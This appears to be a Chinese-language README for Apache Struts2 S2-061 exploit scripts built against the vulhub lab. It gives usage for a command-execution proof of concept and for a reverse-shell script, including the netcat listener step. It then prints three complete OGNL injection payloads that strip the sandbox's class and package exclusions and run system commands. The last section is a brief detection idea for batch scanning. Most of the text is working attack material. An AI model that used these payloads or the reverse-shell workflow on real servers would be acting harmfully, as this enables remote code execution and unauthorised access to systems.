S2-061

脚本皆根据vulhub的struts2-059/061漏洞测试环境来写的，不具普遍性，还望大佬多多指教

- struts2-061-poc.py（可执行简单系统命令）

    用法：python struts2-061-poc.py http://ip:port command
    
    例子：python struts2-061-poc.py http://192.168.0.7:8080 whoami
- S2-061-shell.py（可反弹shell）

    用法：
    1. 首先在一台机器A上监听指定端口(例如：nc -lvvp 7777）
    
    2. 执行脚本：python2 S2-061-shell.py target_url,其中target_url为漏洞环境地址，形式为http://ip:port
    
    3. 根据脚本提示输入A机器的IP及所监听的端口，即可在机器A的监听窗口获取到shell


---
---


以下是几个大佬搞出来的payload：

## payload-1:(from ka1n4t)

`
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
`

## payload-2:(from Smi1e)
完整分析文章：https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&mid=2247485921&idx=1&sn=096e61db21281c6392c6b7d8c70fe458


#### 使用 application，就是思路的完整 POC
`
%{(#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +(#application.map2.setBean(#application.get('map').get('context')) == true).toString().substring(0,0) + (#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map3.setBean(#application.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))}
`


#### 使用 request，单次请求有效的完整 POC (推荐)
`
%{(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'whoami'}))}
`

**注意**：请使用 url 对以上的 OGNL 代码编码后，再在工具上使用。

#### 检测思路：

在新版本的struts2中，已经不能通过参数构造来解析ognl表达式了，所以如果考虑想要使用脚本来进行批量扫描是否有本漏洞的时候，可以考虑直接爆破所有参数，然后判断页面中是否有预计的结果文本即可。
    
eg：
`%{ 'gcowsec-' + (2000 + 20).toString()}`

预计会得到

`gcowsec-2020`

使用脚本判断结果中是否包含就可以了



